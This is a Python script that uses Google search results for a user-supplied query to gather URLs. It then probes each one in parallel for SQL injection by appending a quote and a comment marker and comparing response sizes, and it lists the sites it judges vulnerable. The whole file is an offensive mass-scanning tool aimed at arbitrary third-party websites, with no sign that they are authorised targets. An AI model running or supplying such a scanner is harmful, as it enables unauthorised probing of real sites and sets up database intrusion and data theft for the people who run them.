import googlesearch
import requests
import multiprocessing
import sys

def SoupCheck(o):
	r = requests.get(o)
	sqlitest = requests.get(o+"'")
	sqlitest2 = requests.get(o+"--")
	if sys.getsizeof(r.content) != sys.getsizeof(sqlitest.content):
		if sys.getsizeof(sqlitest2.content)==sys.getsizeof(r.content):
			print ('\033[92m''[+] ' + o + ' is vulnerable from Cache')
			return o

def CheckSqli(x):
	print ('\033[96m''[-] Testing {} for sql injection'.format(x))
	try:
		Request = requests.get(x)
		if Request.status_code == 200:
			Sqlitest = requests.get(x+"'")
			try:
				if Sqlitest.headers['Content-length'] != Request.headers['Content-length']:
					Sqlitest2 = requests.get(x+"--")
					if Sqlitest2.headers['Content-length'] == Request.headers['Content-length']:
						print('\033[92m''[+] ' + x + ' is vulnerable')
						return x
			except requests.exceptions.ConnectionError:
				print ('\033[93m''Connection Error at {}'.format(x))
			except KeyError:
				print ('\033[93m''[~] {} has been Cached'.format(x))
				oof = SoupCheck(x)
				return oof
	except requests.exceptions.SSLError:
		print('\033[93m''[~] SSLError in {}'.format(x))
	except requests.exceptions.ConnectionError:
		print ('\033[93m''[~] Max Retries Exceeded in {}'.format(x))
	except requests.exceptions.TooManyRedirects:
		print ('\033[93m''[~] Too many Redirects in {}'.format(x))

def main():
	Query = input('Enter the query to search: ')
	HowMany = int(input('How many result to search: '))
	Threads = int(input('How many Threads: '))
	vuln = []
	processes = []
	with multiprocessing.Pool(Threads) as pool:
		results = pool.map(CheckSqli, googlesearch.search(Query, num_results=HowMany))
		pool.close()
		pool.join()
		for i in results:
			if i != None:
				vuln.append(i)
	print ('Vulnerable sites: ')
	for i in vuln:
		print (i)

main()